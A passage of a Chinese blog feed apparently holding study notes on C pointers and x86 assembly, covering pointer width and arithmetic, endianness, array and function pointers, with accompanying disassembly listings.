v[10]</span></span><br><span class="line">    v[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    v[<span class="number">1</span>] = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="字符串数组"><a href="#字符串数组" class="headerlink" title="字符串数组"></a>字符串数组</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> arr[<span class="number">10</span>];</span><br><span class="line">arr[<span class="number">0</span>] = <span class="string">&#x27;c&#x27;</span>;</span><br><span class="line">arr[<span class="number">1</span>] = <span class="string">&#x27;h&#x27;</span>;</span><br><span class="line">arr[<span class="number">2</span>] = <span class="string">&#x27;i&#x27;</span>;</span><br><span class="line">arr[<span class="number">3</span>] = <span class="string">&#x27;n&#x27;</span>;</span><br><span class="line">arr[<span class="number">4</span>] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">arr[<span class="number">5</span>] = <span class="string">&#x27;\0&#x27;</span>;<span class="comment">//or 0 or null</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,arr);</span><br></pre></td></tr></table></figure><p>如果没有<code>\0</code>结果会出现垃圾数据，可以通过gb2312编码输出中文。</p><h2 id="寄存器与内存的区别"><a href="#寄存器与内存的区别" class="headerlink" title="寄存器与内存的区别"></a>寄存器与内存的区别</h2><ol><li>寄存器位于CPU内部，执行速度快，但比较贵</li><li>内存速度相对较慢，但成本低，可以做的很大</li><li>寄存器和内存没有本质上的区别，都是用于存储数据的容器，都是定宽的</li></ol><p>32位的计算机和64位的计算机区别在于寻址能力而不是CPU。</p><p>32位的计算机有32根总线，我们可以理解为32位Bit，一个32位计算机内存寻址的最大范围是<code>0xFFFFFFFF+1</code>（加一是因为包括0）。0xFFFFFFFF+1字节可以转换成4g。所以32位计算机最大只能有4g内存，在大无法识别。并且因为本身自带的硬件占用一些，远远不到4g。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov word DS:ptr[0x12345678], 0xFFFF</span><br></pre></td></tr></table></figure><p>ptr的意思后面是一个指针（指针里面存储了一个地址），word的意思是要读写多少，可以改成<code>byte</code>，<code>word</code>和<code>dword</code></p><p><strong>每个内存单元能存储一个字节。每个字节有个编号，称为内存地址。</strong></p><h2 id="大端序和小端序"><a href="#大端序和小端序" class="headerlink" title="大端序和小端序"></a>大端序和小端序</h2><p>我们首先使用指令：<code>mov dword ptr [0x19FF74],0x23456789</code></p><p>然后会发现数据窗口是这么存储23456789的</p><p><img src="https://i.loli.net/2020/08/20/7Cz2UQ1V3MsGuNF.png" alt="image-20200820124756561.png"></p><p>这是因为字节的存储顺序是小端序，<strong>数据的高位字节存放在内存的高地址</strong></p><p>大端序则是高字节存放在内存的低地址。</p><h1 id="0x06-指针"><a href="#0x06-指针" class="headerlink" title="0x06 指针"></a>0x06 指针</h1><h2 id="带-类型的宽度"><a href="#带-类型的宽度" class="headerlink" title="带*类型的宽度"></a>带*类型的宽度</h2><p><strong>任何数据类型加上*（不管是一个*还是多个*）都会变成新的类型，宽度为4字节(32位系统)</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">SS</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="keyword">int</span> y;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* x;</span><br><span class="line">    <span class="keyword">short</span>**** y;</span><br><span class="line">    <span class="keyword">int</span>* z;</span><br><span class="line">    SS* b;</span><br><span class="line">    x = (<span class="keyword">char</span>*)<span class="number">1</span>;</span><br><span class="line">    y = (<span class="keyword">short</span>****)<span class="number">2</span>;</span><br><span class="line">    z = (<span class="keyword">int</span>*)<span class="number">3</span>;</span><br><span class="line">    b = (SS*)<span class="number">4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="带-类型的-–"><a href="#带-类型的-–" class="headerlink" title="带*类型的++ –"></a>带*类型的++ –</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* a;</span><br><span class="line">    <span class="keyword">short</span>* b;</span><br><span class="line">    <span class="keyword">int</span>* c;</span><br><span class="line">    </span><br><span class="line">    a = (<span class="keyword">char</span>*)<span class="number">100</span>;</span><br><span class="line">    b = (<span class="keyword">short</span>*)<span class="number">100</span>;</span><br><span class="line">    c = (<span class="keyword">int</span>*)<span class="number">100</span>;</span><br><span class="line">    </span><br><span class="line">    a++;</span><br><span class="line">    b++;</span><br><span class="line">    c++;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %d %d&quot;</span>,a,b,c);</span><br><span class="line">    <span class="comment">//101 102 104</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>去掉一个星号之后的宽度决定加几减几。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>** a;</span><br><span class="line">    <span class="keyword">short</span>*** b;</span><br><span class="line">    <span class="keyword">int</span>**** c;</span><br><span class="line">    </span><br><span class="line">    a = (<span class="keyword">char</span>**)<span class="number">100</span>;</span><br><span class="line">    b = (<span class="keyword">short</span>***)<span class="number">100</span>;</span><br><span class="line">    c = (<span class="keyword">int</span>****)<span class="number">100</span>;</span><br><span class="line">    </span><br><span class="line">    a++;</span><br><span class="line">    b++;</span><br><span class="line">    c++;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %d %d&quot;</span>,a,b,c);</span><br><span class="line">    <span class="comment">//32位系统104 104 104</span></span><br><span class="line">    <span class="comment">//64位系统108 108 108</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>char**去掉一个*宽度为4，short ***去掉一个*宽度也为4。</p><h2 id="带-类型的加减法"><a href="#带-类型的加减法" class="headerlink" title="带*类型的加减法"></a>带*类型的加减法</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* a;</span><br><span class="line">    <span class="keyword">short</span>* b;</span><br><span class="line">    <span class="keyword">int</span>* c;</span><br><span class="line">    </span><br><span class="line">    a = (<span class="keyword">char</span>*)<span class="number">100</span>;</span><br><span class="line">    b = (<span class="keyword">short</span>*)<span class="number">100</span>;</span><br><span class="line">    c = (<span class="keyword">int</span>*)<span class="number">100</span>;</span><br><span class="line">    </span><br><span class="line">    a+=<span class="number">5</span>;</span><br><span class="line">    b+=<span class="number">5</span>;</span><br><span class="line">    c+=<span class="number">5</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %d %d&quot;</span>,a,b,c);</span><br><span class="line">    <span class="comment">//105 110 120</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和前面一样，先去掉*看字节宽度，然后char+5就是5×1。short就是5×2。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>** a;</span><br><span class="line">    <span class="keyword">short</span>** b;</span><br><span class="line">    <span class="keyword">int</span>** c;</span><br><span class="line">    </span><br><span class="line">    a = (<span class="keyword">char</span>**)<span class="number">100</span>;</span><br><span class="line">    b = (<span class="keyword">short</span>**)<span class="number">100</span>;</span><br><span class="line">    c = (<span class="keyword">int</span>**)<span class="number">100</span>;</span><br><span class="line">    </span><br><span class="line">    a+=<span class="number">5</span>;</span><br><span class="line">    b+=<span class="number">5</span>;</span><br><span class="line">    c+=<span class="number">5</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %d %d&quot;</span>,a,b,c);</span><br><span class="line">    <span class="comment">//120 120 120</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同理</p><p><strong>总结</strong></p><ul><li>带*类型的变量可以加、减一个整数，但是不能乘除。(编译器不允许)</li><li>带*类型变量与其他整数相加或相减的时候：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">带*类型变量 + N = 带*类型变量 + N*(去掉一个*后类型的宽度)</span><br><span class="line">带*类型变量 - N = 带*类型变量 - N*(去掉一个*后类型的宽度)</span><br></pre></td></tr></table></figure><h2 id="两个带-的类型相减"><a href="#两个带-的类型相减" class="headerlink" title="两个带*的类型相减"></a>两个带*的类型相减</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span>* a;</span><br><span class="line"><span class="keyword">char</span>* b;</span><br><span class="line">a = (<span class="keyword">char</span>*)<span class="number">200</span>;</span><br><span class="line">b = (<span class="keyword">char</span>*)<span class="number">100</span>;</span><br><span class="line"><span class="keyword">int</span> x = a-b;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,x);<span class="comment">//100</span></span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>** a;</span><br><span class="line">    <span class="keyword">char</span>** b;</span><br><span class="line">    a = (<span class="keyword">char</span>**)<span class="number">200</span>;</span><br><span class="line">    b = (<span class="keyword">char</span>**)<span class="number">100</span>;</span><br><span class="line">    <span class="keyword">int</span> x = a-b;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,x);<span class="comment">//25((200-100)/4)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结：</p><ol><li>两个类型相同的带*类型的变量可以进行减法操作</li><li>想减的结果要除以去掉一个*的数据的宽度</li><li><strong>两个带*类型相减完的结果是int</strong></li></ol><h2 id="两个带-的类型作比较"><a href="#两个带-的类型作比较" class="headerlink" title="两个带*的类型作比较"></a>两个带*的类型作比较</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>** a;</span><br><span class="line">    <span class="keyword">char</span>** b;</span><br><span class="line">    a = (<span class="keyword">char</span>**)<span class="number">200</span>;</span><br><span class="line">    b = (<span class="keyword">char</span>**)<span class="number">100</span>;</span><br><span class="line">    <span class="keyword">if</span>(a&gt;b)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//1</span></span><br></pre></td></tr></table></figure><p>带*的变量，如果类型相同，可以做大小的比较。</p><br><h1 id="0x07-指针-2"><a href="#0x07-指针-2" class="headerlink" title="0x07 指针 2"></a>0x07 指针 2</h1><h2 id="取地址符-amp"><a href="#取地址符-amp" class="headerlink" title="取地址符&amp;"></a>取地址符&amp;</h2><ul><li>&amp;可以取任何<strong>变量</strong>的地址</li><li>&amp;a的类型就是a的类型加上*</li><li>带*的类型用来存储地址</li></ul><p>局部变量</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>**** a;</span><br><span class="line">    <span class="keyword">short</span> b;</span><br><span class="line">    <span class="keyword">int</span>* c;</span><br><span class="line">    <span class="keyword">char</span>***** aa= &amp;a;</span><br><span class="line">    <span class="keyword">short</span>* bb = &amp;b;</span><br><span class="line">    <span class="keyword">int</span>** cc = &amp;c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1:        char**** a;</span><br><span class="line">2:        short b;</span><br><span class="line">3:        int* c;</span><br><span class="line">4:       char***** aa= &amp;a;</span><br><span class="line">00401028   lea         eax,[ebp-4]</span><br><span class="line">0040102B   mov         dword ptr [ebp-10h],eax</span><br><span class="line">5:       short* bb = &amp;b;</span><br><span class="line">0040102E   lea         ecx,[ebp-8]</span><br><span class="line">00401031   mov         dword ptr [ebp-14h],ecx</span><br><span class="line">6:       int** cc = &amp;c;</span><br><span class="line">00401034   lea         edx,[ebp-0Ch]</span><br><span class="line">00401037   mov         dword ptr [ebp-18h],edx</span><br></pre></td></tr></table></figure><p>全局变量</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span>**** a;</span><br><span class="line"><span class="keyword">short</span> b;</span><br><span class="line"><span class="keyword">int</span>* c;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>***** aa= &amp;a;</span><br><span class="line">    <span class="keyword">short</span>* bb = &amp;b;</span><br><span class="line">    <span class="keyword">int</span>** cc = &amp;c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">9:        char***** aa= &amp;a;</span><br><span class="line">00401028   mov         dword ptr [ebp-4],offset a (00427e3c)</span><br><span class="line">10:       short* bb = &amp;b;</span><br><span class="line">0040102F   mov         dword ptr [ebp-8],offset b (00427e38)</span><br><span class="line">11:       int** cc = &amp;c;</span><br><span class="line">00401036   mov         dword ptr [ebp-0Ch],offset c (00427e34)</span><br></pre></td></tr></table></figure><p>offset a的意思是指a的地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lea eax, [00427e3c]</span><br><span class="line">mov dword ptr [ebp-4],eax</span><br><span class="line">; 意思一样</span><br></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title="*"></a>*</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>* x;</span><br><span class="line"><span class="comment">//*x == int</span></span><br><span class="line"><span class="keyword">char</span>** y;</span><br><span class="line"><span class="comment">//*y == char*</span></span><br></pre></td></tr></table></figure><p>源码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a = <span class="number">22</span>;</span><br><span class="line"><span class="keyword">int</span>* b = &amp;a;</span><br><span class="line"><span class="keyword">int</span> c = *b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反汇编：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00401028   mov         dword ptr [ebp-4],16h</span><br><span class="line">0040102F   lea         eax,[ebp-4]</span><br><span class="line">00401032   mov         dword ptr [ebp-8],eax</span><br><span class="line">00401035   mov         ecx,dword ptr [ebp-8]</span><br><span class="line">00401038   mov         edx,dword ptr [ecx]</span><br><span class="line">0040103A   mov         dword ptr [ebp-0Ch],edx</span><br></pre></td></tr></table></figure><p>编译器没有直接把地址存到ecx里，而是用ecx和edx进行过渡。</p><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> arr[<span class="number">5</span>] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line">    <span class="comment">//int* x = &amp;arr[0]可以简写成int* x = arr</span></span><br><span class="line">    <span class="keyword">int</span>* x = arr;</span><br><span class="line">    x+<span class="number">1</span>;</span><br><span class="line">    <span class="comment">//x+1==地址+1×4</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em><em>int</em> x = &amp;arr[0]可以简写成int</em> x = arr**</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span>* a;</span><br><span class="line">    <span class="comment">//*(a+0) == a[0];</span></span><br><span class="line"><span class="comment">//*(a+2) == a[2];</span></span><br><span class="line">    <span class="keyword">char</span>** b;</span><br><span class="line">    <span class="comment">//*(*(b+0)+0) == b[0][0];</span></span><br><span class="line">    <span class="comment">//*(*(b+2)+3) == b[2][3];</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>汇编：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">1:        int* a;</span><br><span class="line">2:        printf(&quot;%d&quot;,*(a+0));</span><br><span class="line">0040D838   mov         eax,dword ptr [ebp-4]</span><br><span class="line">0040D83B   mov         ecx,dword ptr [eax]</span><br><span class="line">0040D83D   push        ecx</span><br><span class="line">0040D83E   push        offset string &quot;%s &quot; (0042201c)</span><br><span class="line">0040D843   call        printf (00401060)</span><br><span class="line">0040D848   add         esp,8</span><br><span class="line">3:        printf(&quot;%d&quot;,a[0]);</span><br><span class="line">0040D84B   mov         edx,dword ptr [ebp-4]</span><br><span class="line">0040D84E   mov         eax,dword ptr [edx]</span><br><span class="line">0040D850   push        eax</span><br><span class="line">0040D851   push        offset string &quot;%s &quot; (0042201c)</span><br><span class="line">0040D856   call        printf (00401060)</span><br><span class="line">0040D85B   add         esp,8</span><br><span class="line">4:        printf(&quot;%d&quot;,*(a+2));</span><br><span class="line">0040D85E   mov         ecx,dword ptr [ebp-4]</span><br><span class="line">0040D861   mov         edx,dword ptr [ecx+8]</span><br><span class="line">0040D864   push        edx</span><br><span class="line">0040D865   push        offset string &quot;%s &quot; (0042201c)</span><br><span class="line">0040D86A   call        printf (00401060)</span><br><span class="line">0040D86F   add         esp,8</span><br><span class="line">5:       printf(&quot;%d&quot;,a[2]);</span><br><span class="line">0040D872   mov         eax,dword ptr [ebp-4]</span><br><span class="line">0040D875   mov         ecx,dword ptr [eax+8]</span><br><span class="line">0040D878   push        ecx</span><br><span class="line">0040D879   push        offset string &quot;%s &quot; (0042201c)</span><br><span class="line">0040D87E   call        printf (00401060)</span><br><span class="line">0040D883   add         esp,8</span><br><span class="line">6:       char** b;</span><br><span class="line">7:       printf(&quot;%d&quot;,*(*(b+0)+0));</span><br><span class="line">0040D886   mov         edx,dword ptr [ebp-8]</span><br><span class="line">0040D889   mov         eax,dword ptr [edx]</span><br><span class="line">0040D88B   movsx       ecx,byte ptr [eax]</span><br><span class="line">0040D88E   push        ecx</span><br><span class="line">0040D88F   push        offset string &quot;%s &quot; (0042201c)</span><br><span class="line">0040D894   call        printf (00401060)</span><br><span class="line">0040D899   add         esp,8</span><br><span class="line">8:       printf(&quot;%d&quot;,b[0][0]);</span><br><span class="line">0040D89C   mov         edx,dword ptr [ebp-8]</span><br><span class="line">0040D89F   mov         eax,dword ptr [edx]</span><br><span class="line">0040D8A1   movsx       ecx,byte ptr [eax]</span><br><span class="line">0040D8A4   push        ecx</span><br><span class="line">0040D8A5   push        offset string &quot;%s &quot; (0042201c)</span><br><span class="line">0040D8AA   call        printf (00401060)</span><br><span class="line">0040D8AF   add         esp,8</span><br><span class="line">9:       printf(&quot;%d&quot;,*(*(b+2)+3));</span><br><span class="line">0040D8B2   mov         edx,dword ptr [ebp-8]</span><br><span class="line">0040D8B5   mov         eax,dword ptr [edx+8]</span><br><span class="line">0040D8B8   movsx       ecx,byte ptr [eax+3]</span><br><span class="line">0040D8BC   push        ecx</span><br><span class="line">0040D8BD   push        offset string &quot;%s &quot; (0042201c)</span><br><span class="line">0040D8C2   call        printf (00401060)</span><br><span class="line">0040D8C7   add         esp,8</span><br><span class="line">10:       printf(&quot;%d&quot;,b[2][3]);</span><br><span class="line">0040D8CA   mov         edx,dword ptr [ebp-8]</span><br><span class="line">0040D8CD   mov         eax,dword ptr [edx+8]</span><br><span class="line">0040D8D0   movsx       ecx,byte ptr [eax+3]</span><br><span class="line">0040D8D4   push        ecx</span><br><span class="line">0040D8D5   push        offset string &quot;%s &quot; (0042201c)</span><br><span class="line">0040D8DA   call        printf (00401060)</span><br><span class="line">0040D8DF   add         esp,8</span><br></pre></td></tr></table></figure><h2 id="数组指针"><a href="#数组指针" class="headerlink" title="数组指针"></a>数组指针</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">10</span>] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>&#125;;</span><br><span class="line">    <span class="built_in"><span class="keyword">int</span></span> (*p)[<span class="number">2</span>];</span><br><span class="line">    p = (<span class="built_in"><span class="keyword">int</span></span>(*)[<span class="number">2</span>])a;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,**p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>*p和p的存储内容相同，但是宽度不相同。</strong></p><h2 id="函数指针"><a href="#函数指针" class="headerlink" title="函数指针"></a>函数指针</h2><p>因为函数的宽度是不确定的，所以不能做++–加减整数，相减的操作。但是可以做比较大小的操作。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Fun</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in"><span class="keyword">int</span></span> (*p)(<span class="keyword">int</span>,<span class="keyword">int</span>);</span><br><span class="line">    p = (<span class="built_in"><span class="keyword">int</span></span>(*)<span class="built_in">p</span>(<span class="keyword">int</span>,<span class="keyword">int</span>))Fun;</span><br><span class="line">    p = Fun;<span class="comment">//Fun函数名里面就是地址</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以隐藏代码到数据区</p><p>如果在程序中定义了一个函数，那么在编译时系统就会为这个函数代码分配一段存储空间，这段存储空间的首地址称为这个函数的地址。而且函数名表示的就是这个地址。既然是地址我们就可以定义一个指针变量来存放，这个指针变量就叫作函数指针变量，简称函数指针。</p><p>函数名不能被赋值，所以我们一般调用函数指针</p><br>]]></content>
      
      
      <categories>
          
          <category> 2020年9月 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>[实验] c语言and汇编</title>
      <link href="/2020/09/01/c%E8%AF%AD%E8%A8%80and%E6%B1%87%E7%BC%96/"/>
      <url>/2020/09/01/c%E8%AF%AD%E8%A8%80and%E6%B1%87%E7%BC%96/</url>
      
